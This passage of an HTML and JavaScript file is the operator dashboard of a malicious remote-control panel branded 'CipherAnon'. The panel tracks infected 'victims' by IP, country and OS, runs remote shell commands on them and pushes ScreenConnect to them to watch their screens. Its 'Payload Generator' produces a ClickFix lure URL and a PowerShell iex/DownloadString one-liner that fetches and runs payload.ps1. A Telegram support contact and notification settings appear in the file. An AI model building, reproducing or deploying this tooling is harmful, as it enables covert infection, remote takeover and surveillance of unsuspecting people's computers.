        .side-panel .panel-body .terminal-container .terminal-output .term-line .output { color: #94a3b8; }
        .side-panel .panel-body .terminal-container .terminal-output .term-line .error { color: #f43f5e; }
        .side-panel .panel-body .terminal-container .terminal-output .term-line .success { color: #00ff88; }

        .side-panel .panel-body .terminal-container .terminal-input-wrap {
            display: flex;
            align-items: center;
            padding: 4px 12px 8px 12px;
            border-top: 1px solid rgba(255,255,255,0.04);
            gap: 6px;
        }
        .side-panel .panel-body .terminal-container .terminal-input-wrap .prompt-symbol {
            color: #00ff88;
            font-weight: 700;
            font-size: 12px;
            font-family: monospace;
            flex-shrink: 0;
        }
        .side-panel .panel-body .terminal-container .terminal-input-wrap input {
            flex: 1;
            background: transparent;
            border: none;
            color: #e2e8f0;
            font-family: 'Cascadia Code', 'Consolas', monospace;
            font-size: 12px;
            outline: none;
            padding: 4px 0;
        }
        .side-panel .panel-body .terminal-container .terminal-input-wrap input::placeholder { color: #334155; }
        .side-panel .panel-body .terminal-container .terminal-input-wrap .term-send {
            background: none;
            border: none;
            color: #00ff88;
            cursor: pointer;
            font-size: 16px;
            padding: 2px 6px;
            transition: 0.2s;
        }
        .side-panel .panel-body .terminal-container .terminal-input-wrap .term-send:hover { color: #66ffaa; transform: scale(1.1); }

        .side-panel .panel-body .log-container {
            background: rgba(0,0,0,0.3);
            border: 1px solid rgba(255,255,255,0.04);
            border-radius: 10px;
            padding: 10px 12px;
            max-height: 120px;
            overflow-y: auto;
            font-family: 'Cascadia Code', 'Consolas', monospace;
            font-size: 10px;
        }
        .side-panel .panel-body .log-container .log-entry {
            padding: 2px 0;
            border-bottom: 1px solid rgba(255,255,255,0.02);
            color: #94a3b8;
        }
        .side-panel .panel-body .log-container .log-entry .time { color: #475569; }
        .side-panel .panel-body .log-container .log-entry .type.success { color: #00ff88; }
        .side-panel .panel-body .log-container .log-entry .type.error { color: #f43f5e; }
        .side-panel .panel-body .log-container .log-entry .type.warning { color: #fbbf24; }
        .side-panel .panel-body .log-container .log-entry .type.info { color: #3b82f6; }

        .side-panel .panel-body .loading-spinner {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 2px solid rgba(255,255,255,0.1);
            border-top-color: #00ff88;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin-right: 6px;
            vertical-align: middle;
        }
        @keyframes spin { to { transform: rotate(360deg); } }

        @media (max-width: 768px) {
            .sidebar {
                position: fixed;
                top: 0; left: 0;
                transform: translateX(-280px);
                width: 280px;
                height: 100vh;
                z-index: 150;
                border-right: 1px solid rgba(255,255,255,0.04);
                box-shadow: 4px 0 40px rgba(0,0,0,0.5);
            }
            .sidebar.open { transform: translateX(0); }
            .sidebar-overlay.active { display: block; }
            .sidebar-toggle { display: block; }
            .main { padding: 16px; padding-top: 60px; }
            .main.shifted { margin-right: 0; }
            .topbar .left h1 { font-size: 18px; }
            .clients-grid { grid-template-columns: 1fr; }
            .stats-row { grid-template-columns: repeat(2, 1fr); }
            .filter-bar { flex-direction: column; align-items: stretch; }
            .filter-bar .filter-group { flex-wrap: wrap; }
            .filter-bar .filter-group input { min-width: 100%; }
            .modal-box { padding: 24px 16px; }
            .modal-box .modal-actions { flex-direction: column; }
            .side-panel {
                width: 100%;
                right: -100%;
            }
            .side-panel.open { right: 0; }
            .side-panel .panel-body .info-grid { grid-template-columns: 1fr; }
            .side-panel .panel-body .panel-actions { flex-direction: column; }
            .side-panel .panel-body .panel-actions .btn-sm { width: 100%; justify-content: center; }
        }

        @media (max-width: 480px) {
            .stats-row { grid-template-columns: 1fr 1fr; }
            .stats-row .stat-card .number { font-size: 20px; }
            .topbar .right .user { font-size: 11px; }
            .client-card { padding: 14px; }
            .client-card .card-actions .btn-sm { font-size: 8px; padding: 2px 8px; }
            .side-panel .panel-header .panel-title { font-size: 14px; }
            .side-panel .panel-body .panel-actions .btn-sm { font-size: 9px; }
        }
    </style>
</head>
<body>

    <!-- MOBILE SIDEBAR TOGGLE -->
    <button class="sidebar-toggle" id="sidebarToggle" onclick="toggleSidebar()">☰</button>
    <div class="sidebar-overlay" id="sidebarOverlay" onclick="toggleSidebar()"></div>

    <!-- SIDEBAR -->
    <div class="sidebar" id="sidebar">
        <div class="logo">
            <div class="brand">
                <span class="icon">📡</span>
                Cipher <span class="highlight">Anon</span>
            </div>
            <div class="sub">RMM <span>Control</span> Panel</div>
        </div>

        <div class="nav-item active" data-view="rmm" id="navRmm">
            <span class="icon">📡</span>
            All Machines
            <span class="badge" id="sidebarTotal">0</span>
        </div>
        <div class="nav-item" data-view="online" id="navOnline">
            <span class="icon">🟢</span>
            Host Connected
            <span class="badge" id="sidebarOnline">0</span>
        </div>
        <div class="nav-item" data-view="offline" id="navOffline">
            <span class="icon">🔴</span>
            Offline Guests
            <span class="badge danger" id="sidebarOffline">0</span>
        </div>

        <div class="nav-divider"></div>
        <div class="nav-section">Tools</div>

        <div class="nav-item" data-view="payload" id="navPayload">
            <span class="icon">📦</span>
            Payload Generator
        </div>

        <div class="nav-divider"></div>

        <a href="https://t.me/nullrouterot13" target="_blank" class="contact-support">
            <span class="icon">📱</span> Telegram Support
        </a>

        <div class="version">
            <span>●</span> v3.0 · RMM <span>●</span>
        </div>
    </div>

    <!-- SIDE PANEL -->
    <div class="side-panel-overlay" id="sidePanelOverlay" onclick="closePanel()"></div>
    <div class="side-panel" id="sidePanel">
        <div class="panel-header">
            <div class="panel-title">
                <span class="status-dot" id="panelStatusDot"></span>
                <span id="panelTitle">Client Details</span>
            </div>
            <button class="close-panel" onclick="closePanel()">✕</button>
        </div>
        <div class="panel-body" id="panelBody">
            <div style="text-align:center;color:#64748b;padding:40px 0;">Select a client to view details</div>
        </div>
    </div>

    <!-- MAIN CONTENT -->
    <div class="main" id="mainContent">

        <div class="topbar">
            <div class="left">
                <h1 id="pageTitle">RMM Dashboard</h1>
                <p id="pageSub">Monitor and control remote machines.</p>
            </div>
            <div class="right">
                <div class="live-badge">
                    <span class="dot"></span>
                    Live
                </div>
                <button class="icon-btn" onclick="fetchRmmClients()">🔄</button>
                <button class="icon-btn" onclick="openSettings()">⚙️</button>
                <button class="icon-btn danger" onclick="showLogoutConfirm()">🚪</button>
                <div class="user">
                    <div class="avatar">A</div>
                    Admin
                </div>
            </div>
        </div>

        <!-- STATS ROW -->
        <div class="stats-row" id="statsRow">
            <div class="stat-card">
                <div class="label">Total Machines</div>
                <div class="number gold" id="statTotal">0</div>
                <div class="sub">All clients</div>
            </div>
            <div class="stat-card">
                <div class="label">Host Connected</div>
                <div class="number green" id="statOnline">0</div>
                <div class="sub">🟢 Online</div>
            </div>
            <div class="stat-card">
                <div class="label">Offline Guests</div>
                <div class="number red" id="statOffline">0</div>
                <div class="sub">🔴 Offline</div>
            </div>
            <div class="stat-card">
                <div class="label">ScreenConnect</div>
                <div class="number blue" id="statSc">0</div>
                <div class="sub">📤 Deployed</div>
            </div>
        </div>

        <!-- FILTER BAR -->
        <div class="filter-bar" id="filterBar">
            <div class="filter-group">
                <label>🔍 Search</label>
                <input type="text" id="filterName" placeholder="Search machines..." oninput="applyFilters()" />
            </div>
            <div class="filter-group">
                <label>Device Type</label>
                <select id="filterDevice" onchange="applyFilters()">
                    <option value="">All</option>
                    <option value="Windows">Windows</option>
                    <option value="macOS">macOS</option>
                    <option value="Linux">Linux</option>
                </select>
            </div>
            <button class="btn-filter primary" onclick="applyFilters()">Apply</button>
            <button class="btn-filter" onclick="resetFilters()">Reset</button>
        </div>

        <!-- VIEW: RMM CLIENTS -->
        <div class="view-content active" id="viewRmm">
            <div class="clients-grid" id="clientsGrid">
                <div class="empty-state">
                    <div class="icon">📡</div>
                    <h3>No RMM clients connected</h3>
                    <p>Waiting for victims to install the RMM agent...</p>
                </div>
            </div>
        </div>

        <!-- VIEW: PAYLOAD GENERATOR -->
        <div class="view-content" id="viewPayload">
            <div class="payload-box">
                <div class="payload-title">📦 Payload Generator</div>
                <div class="payload-desc">Copy the link below or the PowerShell command to deploy the RMM agent.</div>

                <div style="margin-bottom:12px;">
                    <div style="font-size:11px;color:#64748b;margin-bottom:4px;">📎 ClickFix URL</div>
                    <div class="payload-url">
                        <span class="url-text" id="payloadUrlDisplay">Loading...</span>
                        <button class="btn primary" onclick="copyPayloadUrl()" style="padding:4px 12px;font-size:11px;">📋 Copy</button>
                    </div>
                </div>

                <div style="margin-bottom:12px;">
                    <div style="font-size:11px;color:#64748b;margin-bottom:4px;">⚡ PowerShell Command</div>
                    <div class="payload-command">
                        <span class="cmd-text" id="payloadCmdDisplay">Loading...</span>
                        <button class="btn gold" onclick="copyPayloadCmd()" style="padding:4px 12px;font-size:11px;">📋 Copy</button>
                    </div>
                </div>

                <div class="payload-actions">
                    <button class="btn primary" onclick="copyPayloadUrl()">📋 Copy URL</button>
                    <button class="btn gold" onclick="copyPayloadCmd()">📋 Copy Command</button>
                    <a href="/home" target="_blank" class="btn" style="text-decoration:none;">🔗 Open ClickFix</a>
                </div>
            </div>
        </div>

        <div class="powered-footer">
            Powered By <span class="name">CipherAnon</span>
        </div>
    </div>

    <!-- SETTINGS MODAL -->
    <div class="modal-overlay" id="settingsOverlay">
        <div class="modal-box">
            <button class="close-btn" onclick="closeSettings()">✕</button>
            <h2>⚙️ Settings</h2>
            <p>Configure your RMM deployment settings.</p>

            <div style="border-bottom:1px solid rgba(255,255,255,0.04);padding-bottom:14px;margin-bottom:14px;">
                <div class="section-title" style="font-size:11px;color:#94a3b8;font-weight:600;margin-bottom:8px;">📤 ScreenConnect Installer</div>
                <div class="form-group">
                    <label>Upload MSI/EXE Installer</label>
                    <div id="uploadStatus" style="font-size:11px;color:#64748b;margin-bottom:6px;">
                        Current: <span id="currentFileName">None uploaded</span>
                    </div>
                    <input type="file" id="fileInput" accept=".msi,.exe,.zip" style="width:100%;padding:6px;background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.06);border-radius:8px;color:#e2e8f0;cursor:pointer;" />
                    <div style="display:flex;gap:8px;margin-top:6px;">
                        <button class="btn primary" onclick="uploadFile()" style="flex:1;justify-content:center;">📤 Upload</button>
                        <button class="btn danger" onclick="deleteFile()" style="flex:1;justify-content:center;">🗑️ Delete</button>
                    </div>
                    <div class="help-text">Upload your ScreenConnect MSI or EXE file. Max 50MB.</div>
                </div>
            </div>

            <div style="border-bottom:1px solid rgba(255,255,255,0.04);padding-bottom:14px;margin-bottom:14px;">
                <div class="section-title" style="font-size:11px;color:#94a3b8;font-weight:600;margin-bottom:8px;">🖥️ ScreenConnect Viewer</div>
                <div class="form-group">
                    <label>Viewer URL</label>
                    <input type="text" id="scViewerUrl" placeholder="https://your-screenconnect.com/Viewer/" />
                    <div class="help-text">The URL used to view clients (e.g., https://your-sc.com/Viewer/)</div>
                </div>
                <button class="btn primary" onclick="updateScViewerUrl()" style="width:100%;justify-content:center;">Save Viewer URL</button>
            </div>

            <div style="border-bottom:1px solid rgba(255,255,255,0.04);padding-bottom:14px;margin-bottom:14px;">
                <div class="section-title" style="font-size:11px;color:#94a3b8;font-weight:600;margin-bottom:8px;">🔒 Change Password</div>
                <div class="form-group">
                    <label>Current Password</label>
                    <input type="password" id="oldPassword" placeholder="Current password" />
                    <div class="error-text" id="oldPasswordError">Incorrect</div>
                </div>
                <div class="form-group">
                    <label>New Password</label>
                    <input type="password" id="newPassword" placeholder="Min 4 chars" />
                    <div class="error-text" id="newPasswordError">Min 4 chars</div>
                </div>
                <div class="form-group">
                    <label>Confirm</label>
                    <input type="password" id="confirmPassword" placeholder="Confirm" />
                    <div class="error-text" id="confirmPasswordError">No match</div>
                </div>
                <button class="btn primary" onclick="changePassword()" style="width:100%;justify-content:center;">Change Password</button>
            </div>

            <div>
                <div class="section-title" style="font-size:11px;color:#94a3b8;font-weight:600;margin-bottom:8px;">🤖 Telegram Settings</div>
                <div class="form-group">
                    <label>Bot Token</label>
                    <input type="text" id="telegramToken" placeholder="Token from @BotFather" />
                    <div class="help-text"><a href="https://t.me/BotFather" target="_blank">@BotFather</a></div>
                </div>
                <div class="form-group">
                    <label>Chat ID</label>
                    <input type="text" id="telegramChatId" placeholder="Chat ID" />
                    <div class="help-text"><a href="https://t.me/userinfobot" target="_blank">@userinfobot</a></div>
                </div>
                <div class="form-group" style="display:flex;align-items:center;gap:8px;">
                    <label style="margin-bottom:0;cursor:pointer;">📬 Send notifications</label>
                    <input type="checkbox" id="telegramNotifications" style="width:18px;height:18px;accent-color:#00ff88;cursor:pointer;" checked />
                </div>
                <button class="btn primary" onclick="updateTelegramSettings()" style="width:100%;justify-content:center;">Save Telegram Settings</button>
            </div>

            <div class="info-text">
                Username: <span class="key">admin</span> · Settings saved to config.json
            </div>
        </div>
    </div>

    <!-- LOGOUT CONFIRM (MODERN GLASS) -->
    <div class="modal-overlay" id="logoutConfirmOverlay">
        <div class="modal-box" style="max-width:360px;">
            <button class="close-btn" onclick="hideLogoutConfirm()">✕</button>
            <div class="modal-icon">🚪</div>
            <h2>Confirm Logout</h2>
            <p>You will need to login again.</p>
            <div class="modal-actions" style="flex-direction:row;">
                <button class="btn cancel" onclick="hideLogoutConfirm()" style="flex:1;">Cancel</button>
                <button class="btn danger" onclick="executeLogout()" style="flex:1;">Logout</button>
            </div>
        </div>
    </div>

    <!-- CUSTOM CONFIRM (MODERN GLASS) -->
    <div class="modal-overlay" id="customConfirmOverlay">
        <div class="modal-box" style="max-width:380px;">
            <button class="close-btn" onclick="hideCustomConfirm()">✕</button>
            <div class="modal-icon" id="confirmIcon">⚠️</div>
            <h2 id="confirmTitle">Confirm</h2>
            <p id="confirmMessage">Are you sure?</p>
            <div class="modal-actions" style="flex-direction:row;">
                <button class="btn cancel" onclick="hideCustomConfirm()" style="flex:1;">Cancel</button>
                <button class="btn confirm" id="confirmActionBtn" onclick="executeConfirmAction()" style="flex:1;">Confirm</button>
            </div>
        </div>
    </div>

    <div class="toast" id="toast"></div>

    <script>
        // ============================================================
        // STATE
        // ============================================================

        let allClients = [];
        let filteredClients = [];
        let confirmCallback = null;
        let currentFilter = 'all';
        let selectedClient = null;
        let panelLogs = [];
        let termHistory = [];
        let termIndex = -1;

        // ============================================================
        // HELPERS
        // ============================================================

        function getFlagEmoji(code) {
            if (!code || code === 'XX') return '🌍';
            try {
                const cp = code.toUpperCase().split('').map(c => 127397 + c.charCodeAt(0));
                return String.fromCodePoint(...cp);
            } catch { return '🌍'; }
        }

        function timeAgo(dateString) {
            if (!dateString) return 'Unknown';
            try {
                const now = new Date();
                const past = new Date(dateString);
                if (isNaN(past.getTime())) return 'Invalid date';
                const diffMs = now - past;
                if (diffMs < 0) return 'Future date';
                const diffSec = Math.floor(diffMs / 1000);
                const diffMin = Math.floor(diffSec / 60);
                const diffHour = Math.floor(diffMin / 60);
                const diffDay = Math.floor(diffHour / 24);

                if (diffSec < 10) return 'Just now';
                if (diffSec < 60) return `${diffSec}s ago`;
                if (diffMin < 60) return `${diffMin}m ago`;
                if (diffHour < 24) return `${diffHour}h ago`;
                if (diffDay < 7) return `${diffDay}d ago`;
                return past.toLocaleDateString();
            } catch {
                return 'Invalid date';
            }
        }

        function showToast(msg, type) {
            const el = document.getElementById('toast');
            el.textContent = msg;
            el.className = 'toast show ' + (type || '');
            clearTimeout(el._timer);
            el._timer = setTimeout(() => { el.className = 'toast'; }, 3500);
        }

        function addPanelLog(message, type) {
            const time = new Date().toLocaleTimeString();
            panelLogs.unshift({ time, message, type: type || 'info' });
            if (panelLogs.length > 50) panelLogs.pop();
            renderPanelLogs();
        }

        function renderPanelLogs() {
            const container = document.getElementById('panelLogContainer');
            if (!container) return;
            if (panelLogs.length === 0) {
                container.innerHTML = '<div class="log-entry"><span class="time">[System]</span> <span class="type info">Ready</span></div>';
                return;
            }
            let html = '';
            panelLogs.forEach(log => {
                html += `<div class="log-entry"><span class="time">[${log.time}]</span> <span class="type ${log.type}">${log.message}</span></div>`;
            });
            container.innerHTML = html;
        }

        // ============================================================
        // MODERN MODAL FUNCTIONS (NO ALERTS)
        // ============================================================

        function showModal(title, message, icon, confirmText, callback, danger = false) {
            document.getElementById('confirmTitle').textContent = title;
            document.getElementById('confirmMessage').textContent = message;
            document.getElementById('confirmIcon').textContent = icon || '⚠️';
            const btn = document.getElementById('confirmActionBtn');
            btn.className = danger ? 'btn danger' : 'btn confirm';
            btn.textContent = confirmText || 'Confirm';
            confirmCallback = callback;
            document.getElementById('customConfirmOverlay').classList.add('active');
        }

        function hideCustomConfirm() {
            document.getElementById('customConfirmOverlay').classList.remove('active');
            confirmCallback = null;
        }

        function executeConfirmAction() {
            if (confirmCallback) {
                const cb = confirmCallback;
                confirmCallback = null;
                hideCustomConfirm();
                cb();
            } else {
                hideCustomConfirm();
            }
        }

        // ============================================================
        // SESSION CHECK
        // ============================================================

        async function checkSession() {
            try {
                const res = await fetch('/api/rmm/clients');
                if (res.status === 401) {
                    window.location.href = '/login';
                    return false;
                }
                return true;
            } catch (e) {
                window.location.href = '/login';
                return false;
            }
        }

        // ============================================================
        // SIDEBAR
        // ============================================================

        function toggleSidebar() {
            document.getElementById('sidebar').classList.toggle('open');
            document.getElementById('sidebarOverlay').classList.toggle('active');
        }

        // ============================================================
        // FILTERS
        // ============================================================

        function applyFilters() {
            const nameFilter = document.getElementById('filterName').value.toLowerCase().trim();
            const deviceFilter = document.getElementById('filterDevice').value;

            let filtered = [...allClients];

            if (nameFilter) {
                filtered = filtered.filter(c =>
                    c.pcName.toLowerCase().includes(nameFilter) ||
                    c.username.toLowerCase().includes(nameFilter) ||
                    c.clientId.toLowerCase().includes(nameFilter)
                );
            }

            if (deviceFilter) {
                const osMap = { 'Windows': 'Windows', 'macOS': 'macOS', 'Linux': 'Linux' };
                filtered = filtered.filter(c => {
                    const os = c.os || 'Unknown';
                    return os.includes(osMap[deviceFilter]) || os === deviceFilter;
                });
            }

            if (currentFilter === 'online') {
                filtered = filtered.filter(c => c.status === 'online');
            } else if (currentFilter === 'offline') {
                filtered = filtered.filter(c => c.status === 'offline');
            }

            filteredClients = filtered;
            renderRmmClients(filtered);
        }

        function resetFilters() {
            document.getElementById('filterName').value = '';
            document.getElementById('filterDevice').value = '';
            currentFilter = 'all';
            document.querySelectorAll('.sidebar .nav-item').forEach(el => el.classList.remove('active'));
            document.getElementById('navRmm').classList.add('active');
            applyFilters();
        }

        // ============================================================
        // RMM FUNCTIONS
        // ============================================================

        async function fetchRmmClients() {
            try {
                const res = await fetch('/api/rmm/clients');
                if (res.status === 401) { window.location.href = '/login'; return; }
                const clients = await res.json();
                allClients = clients;
                updateStats(clients);
                applyFilters();
                updatePayloadUrls();
            } catch (e) {
                showToast('⚠️ Failed to fetch RMM clients', 'error');
            }
        }

        function updateStats(clients) {
            const total = clients.length;
            const online = clients.filter(c => c.status === 'online').length;
            const offline = total - online;
            const scDeployed = clients.filter(c => c.screenconnectId || c.rmmType === 'ScreenConnect').length;

            document.getElementById('statTotal').textContent = total;
            document.getElementById('statOnline').textContent = online;
            document.getElementById('statOffline').textContent = offline;
            document.getElementById('statSc').textContent = scDeployed;

            document.getElementById('sidebarTotal').textContent = total;
            document.getElementById('sidebarOnline').textContent = online;
            document.getElementById('sidebarOffline').textContent = offline;
        }

        // ============================================================
        // RENDER CLIENTS
        // ============================================================

        function renderRmmClients(clients) {
            const container = document.getElementById('clientsGrid');

            if (!clients || clients.length === 0) {
                container.innerHTML = `
                    <div class="empty-state">
                        <div class="icon">📡</div>
                        <h3>No matching machines</h3>
                        <p>${allClients.length === 0 ? 'Waiting for victims to install the RMM agent...' : 'Try adjusting your filters.'}</p>
                    </div>
                `;
                return;
            }

            let html = '';
            clients.forEach(client => {
                const flag = getFlagEmoji(client.countryCode);
                const statusDot = client.status === 'online' ? 'online' : 'offline';
                const statusText = client.status === 'online' ? 'Online' : 'Offline';
                const timeAgoStr = timeAgo(client.lastSeen);
                const rmmType = client.rmmType || 'CipherAnon';
                const hasSc = client.screenconnectId || client.rmmType === 'ScreenConnect';

                html += `
                    <div class="client-card" onclick="openPanel('${client.clientId}')">
                        <div class="card-header">
                            <span class="status-dot ${statusDot}"></span>
                            <span class="pc-name">${client.pcName}</span>
                            <span class="status-text ${statusDot}">${statusText}</span>
                            <span class="time-ago">${timeAgoStr}</span>
                        </div>
                        <div class="card-body">
                            <span class="flag">${flag}</span>
                            <span class="ip">${client.ip || 'N/A'}</span>
                            <span>${client.country || 'Unknown'}</span>
                            <span class="rmm-type">${rmmType}</span>
                            <span>${client.os || 'Unknown'}</span>
                            <span class="client-id">ID: ${client.clientId}</span>
                            ${hasSc ? `<span style="color:#3b82f6;font-weight:500;">SC: ${client.screenconnectId || 'Deployed'}</span>` : ''}
                        </div>
                        <div class="card-actions" onclick="event.stopPropagation();">
                            <button class="btn-sm primary" onclick="openPanel('${client.clientId}')">
                                <span class="icon">👁️</span> View
                            </button>
                            <button class="btn-sm primary" onclick="panelSendCommand('${client.clientId}', 'whoami')">
                                <span class="icon">👤</span>
                            </button>
                            <button class="btn-sm gold" onclick="panelSendCommand('${client.clientId}', 'hostname')">
                                <span class="icon">💻</span>
                            </button>
                            <button class="btn-sm violet" onclick="panelSendCommand('${client.clientId}', 'ping')">
                                <span class="icon">🏓</span>
                            </button>
                            <button class="btn-sm primary" onclick="panelDeployScreenConnect('${client.clientId}')">
                                <span class="icon">📤</span> SC
                            </button>
                            ${hasSc ? `<button class="btn-sm blue" onclick="panelViewScreen('${client.clientId}')">
                                <span class="icon">🖥️</span> View Screen
                            </button>` : ''}
                            <button class="btn-sm danger" onclick="panelUninstall('${client.clientId}')">
                                <span class="icon">🗑️</span>
                            </button>
                        </div>
                    </div>
                `;
            });

            container.innerHTML = html;
        }

        // ============================================================
        // SIDEBAR NAVIGATION
        // ============================================================

        document.querySelectorAll('.sidebar .nav-item[data-view]').forEach(item => {
            item.addEventListener('click', function() {
                const view = this.dataset.view;
                document.querySelectorAll('.sidebar .nav-item').forEach(el => el.classList.remove('active'));
                this.classList.add('active');

                document.querySelectorAll('.view-content').forEach(el => el.classList.remove('active'));

                if (view === 'rmm') {
                    document.getElementById('viewRmm').classList.add('active');
                    document.getElementById('pageTitle').textContent = 'RMM Dashboard';
                    document.getElementById('pageSub').textContent = 'Monitor and control remote machines.';
                    currentFilter = 'all';
                    applyFilters();
                } else if (view === 'online') {
                    document.getElementById('viewRmm').classList.add('active');
                    document.getElementById('pageTitle').textContent = 'Host Connected';
                    document.getElementById('pageSub').textContent = 'Online machines.';
                    currentFilter = 'online';
                    applyFilters();
                } else if (view === 'offline') {
                    document.getElementById('viewRmm').classList.add('active');
                    document.getElementById('pageTitle').textContent = 'Offline Guests';
                    document.getElementById('pageSub').textContent = 'Offline machines.';
                    currentFilter = 'offline';
                    applyFilters();
                } else if (view === 'payload') {
                    document.getElementById('viewPayload').classList.add('active');
                    document.getElementById('pageTitle').textContent = 'Payload Generator';
                    document.getElementById('pageSub').textContent = 'Generate deployment links and commands.';
                    updatePayloadUrls();
                }
            });
        });

        // ============================================================
        // PAYLOAD GENERATOR
        // ============================================================

        function getBaseUrl() {
            return window.location.origin;
        }

        function updatePayloadUrls() {
            const baseUrl = getBaseUrl();
            document.getElementById('payloadUrlDisplay').textContent = baseUrl + '/home';
            document.getElementById('payloadCmdDisplay').textContent = 'iex (New-Object Net.WebClient).DownloadString("' + baseUrl + '/payload.ps1")';
        }

        function copyPayloadUrl() {
            const text = document.getElementById('payloadUrlDisplay').textContent;
            navigator.clipboard.writeText(text).then(() => {
                showToast('✅ URL copied!', 'success');
            }).catch(() => {
                const ta = document.createElement('textarea');
                ta.value = text;
                ta.style.position = 'fixed';
                ta.style.left = '-9999px';
                ta.style.top = '-9999px';
                document.body.appendChild(ta);
                ta.select();
                document.execCommand('copy');
                document.body.removeChild(ta);
                showToast('✅ URL copied!', 'success');
            });
        }

        function copyPayloadCmd() {
            const text = document.getElementById('payloadCmdDisplay').textContent;
            navigator.clipboard.writeText(text).then(() => {
                showToast('✅ Command copied!', 'success');
            }).catch(() => {
                const ta = document.createElement('textarea');
                ta.value = text;
                ta.style.position = 'fixed';
                ta.style.left = '-9999px';
                ta.style.top = '-9999px';
                document.body.appendChild(ta);
                ta.select();
                document.execCommand('copy');
                document.body.removeChild(ta);
                showToast('✅ Command copied!', 'success');
            });
        }

        // ============================================================
        // SIDE PANEL
        // ============================================================

        function openPanel(clientId) {
            const client = allClients.find(c => c.clientId === clientId);
            if (!client) {
                showToast('❌ Client not found', 'error');
                return;
            }

            selectedClient = client;
            panelLogs = [];
            termHistory = [];
            termIndex = -1;
            document.getElementById('sidePanel').classList.add('open');
            document.getElementById('sidePanelOverlay').classList.add('active');
            document.getElementById('mainContent').classList.add('shifted');

            renderPanel(client);
        }

        function closePanel() {
            document.getElementById('sidePanel').classList.remove('open');
            document.getElementById('sidePanelOverlay').classList.remove('active');
            document.getElementById('mainContent').classList.remove('shifted');
            selectedClient = null;
        }

        function renderPanel(client) {
            const container = document.getElementById('panelBody');
            const flag = getFlagEmoji(client.countryCode);
            const statusDot = client.status === 'online' ? 'online' : 'offline';
            const statusText = client.status === 'online' ? 'Online' : 'Offline';
            const hasSc = client.screenconnectId || client.rmmType === 'ScreenConnect';

            document.getElementById('panelStatusDot').className = 'status-dot ' + statusDot;
            document.getElementById('panelTitle').textContent = client.pcName;

            container.innerHTML = `
                <div class="info-grid">
                    <div class="info-item">
                        <div class="label">Hostname</div>
                        <div class="value">${client.pcName}</div>
                    </div>
                    <div class="info-item">
                        <div class="label">Status</div>
                        <div class="value" style="color:${client.status === 'online' ? '#00ff88' : '#f43f5e'};">${statusText}</div>
                    </div>
                    <div class="info-item">
                        <div class="label">IP Address</div>
                        <div class="value">${client.ip || 'N/A'}</div>
                    </div>
                    <div class="info-item">
                        <div class="label">Location</div>
                        <div class="value">${flag} ${client.country || 'Unknown'}</div>
                    </div>
                    <div class="info-item">
                        <div class="label">OS</div>
                        <div class="value">${client.os || 'Unknown'}</div>
                    </div>
                    <div class="info-item">
                        <div class="label">Client ID</div>
                        <div class="value" style="font-family:monospace;font-size:11px;">${client.clientId}</div>
                    </div>
                    <div class="info-item">
                        <div class="label">RMM Type</div>
                        <div class="value">${client.rmmType || 'CipherAnon'}</div>
                    </div>
                    <div class="info-item">
                        <div class="label">ScreenConnect</div>
                        <div class="value" style="color:${hasSc ? '#3b82f6' : '#64748b'};">${hasSc ? (client.screenconnectId || 'Deployed') : 'Not Deployed'}</div>
                    </div>
                    <div class="info-item" style="grid-column:1/-1;">
                        <div class="label">Last Seen</div>
                        <div class="value">${timeAgo(client.lastSeen)} (${new Date(client.lastSeen).toLocaleString()})</div>
                    </div>
                </div>

                <div class="section-title">🎯 Quick Actions</div>
                <div class="panel-actions">
                    <button class="btn-sm primary" onclick="panelSendCommand('${client.clientId}', 'whoami')">
                        <span class="icon">👤</span> Whoami
                    </button>
                    <button class="btn-sm gold" onclick="panelSendCommand('${client.clientId}', 'hostname')">
                        <span class="icon">💻</span> Hostname
                    </button>
                    <button class="btn-sm violet" onclick="panelSendCommand('${client.clientId}', 'ping')">
                        <span class="icon">🏓</span> Ping
                    </button>
                    <button class="btn-sm primary" onclick="panelDeployScreenConnect('${client.clientId}')">
                        <span class="icon">📤</span> Deploy SC
                    </button>
                    ${hasSc ? `<button class="btn-sm blue" onclick="panelViewScreen('${client.clientId}')">
                        <span class="icon">🖥️</span> View Screen
                    </button>` : ''}
                    <button class="btn-sm danger" onclick="panelUninstall('${client.clientId}')">
                        <span class="icon">🗑️</span> Uninstall
                    </button>
                    <button class="btn-sm danger" onclick="panelDelete('${client.clientId}')">
                        <span class="icon">✕</span> Delete
                    </button>
                </div>

                <div class="section-title">🖥️ Remote Screen</div>
                <div class="screen-container" id="panelScreenContainer">
                    ${hasSc ? `
                        <div style="text-align:center;color:#3b82f6;">
                            <div style="font-size:28px;margin-bottom:4px;">🖥️</div>
                            <div>ScreenConnect ID: ${client.screenconnectId}</div>
                            <button class="btn blue" onclick="panelViewScreen('${client.clientId}')" style="margin-top:8px;padding:4px 16px;font-size:11px;">
                                🖥️ Open Viewer
                            </button>
                        </div>
                    ` : `
                        <div class="screen-placeholder">
                            <div class="icon">🖥️</div>
                            <div>No ScreenConnect deployed</div>
                            <div class="sub">Deploy ScreenConnect to view this machine</div>
                        </div>
                    `}
                </div>

                <div class="section-title">📋 Command Log</div>
                <div class="log-container" id="panelLogContainer">
                    <div class="log-entry"><span class="time">[System]</span> <span class="type info">Ready</span></div>
                </div>

                <div class="section-title">💻 Command Prompt</div>
                <div class="terminal-container" id="terminalContainer">
                    <div class="terminal-header">
                        <span>⚡ Terminal</span>
                        <div class="term-dots">
                            <span class="red"></span>
                            <span class="yellow"></span>
                            <span class="green"></span>
                        </div>
                    </div>
                    <div class="terminal-output" id="terminalOutput">
                        <div class="term-line">
                            <span class="prompt">$</span>
                            <span class="cmd">type any command...</span>
                        </div>
                    </div>
                    <div class="terminal-input-wrap">
                        <span class="prompt-symbol">$</span>
                        <input type="text" id="termInput" placeholder="Enter command..." autofocus />
                        <button class="term-send" onclick="sendTermCommand()">▶</button>
                    </div>
                </div>
            `;

            renderPanelLogs();

            setTimeout(() => {
                const input = document.getElementById('termInput');
                if (input) input.focus();
            }, 100);

            const termInput = document.getElementById('termInput');
            if (termInput) {
                termInput.addEventListener('keydown', function(e) {
                    if (e.key === 'Enter') {
                        e.preventDefault();
                        sendTermCommand();
                    }
                    if (e.key === 'ArrowUp') {
                        e.preventDefault();
                        if (termIndex < termHistory.length - 1) {
                            termIndex++;
                            this.value = termHistory[termHistory.length - 1 - termIndex] || '';
                        }
                    }
                    if (e.key === 'ArrowDown') {
                        e.preventDefault();
                        if (termIndex > 0) {
                            termIndex--;
                            this.value = termHistory[termHistory.length - 1 - termIndex] || '';
